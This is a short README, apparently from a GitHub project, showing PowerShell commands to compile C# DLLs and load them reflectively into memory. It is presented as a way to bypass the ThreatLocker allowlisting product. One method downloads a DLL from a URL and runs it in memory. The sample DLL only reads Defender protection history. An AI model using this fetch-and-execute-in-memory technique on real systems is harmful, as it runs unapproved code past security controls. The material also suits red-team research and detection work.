# Refletively load C# DLLs via PowerShell  

Based on https://ruptura-infosec.com/hack-of-the-month/bypassing-threatlocker-with-powershell/  

Add C Sharp Compiler to path
```powershell  
[System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\Roslyn\", [System.EnvironmentVariableTarget]::Machine)
```  

Compile DLL from .cs    
```powershell  
csc /target:library /out:payload.dll test.cs
csc /target:library /out:get-sec-history.dll get-sec-history.cs
```  

Load DLL reflectively in PowerShell POC
```powershell  
$currentDir = Get-Location
$bytes = [IO.File]::ReadAllBytes("$currentDir\payload.dll")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$instance = $assembly.CreateInstance("ProgramNamespace.Program")
$instance.RunO()
```  

Load Dll method 1 (Invoke method from local file)  
```powershell  
# Get the current directory
$currentDir = Get-Location

# Load the DLL into memory
$bytes = [IO.File]::ReadAllBytes("$currentDir\get-sec-history.dll")
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Create an instance of the DefenderHistory class
$type = $assembly.GetType("SecurityTools.DefenderHistory")

# Invoke the static method GetProtectionHistory and display the output
$output = $type.GetMethod("GetProtectionHistory").Invoke($null, $null)
Write-Output $output

```  

Load DLL method 2 (Create instance from local file)  
```powershell  
# Get the current directory
$currentDir = Get-Location

# Load the DLL from the current directory
$bytes = [IO.File]::ReadAllBytes("$currentDir\get-sec-history.dll")
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Create an instance of DefenderHistory class and invoke the method
$instance = $assembly.CreateInstance("SecurityTools.DefenderHistory")
$output = $instance.GetProtectionHistory()
Write-Output $output
```  

Load DLL method 3 (Create instance from web request)  
```powershell  
# URL of the DLL on the web server
$url = "https://github.com/timsonner/load-cs-dll-from-powershell/raw/refs/heads/master/get-sec-history.dll"

# Download the DLL as bytes
$bytes = (New-Object Net.WebClient).DownloadData($url)

# Load the assembly directly from the byte array
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Create an instance of the DefenderHistory class
$instance = $assembly.CreateInstance("SecurityTools.DefenderHistory")

# Invoke the GetProtectionHistory method
$output = $instance.GetProtectionHistory()

# Display the output
Write-Output $output

```  
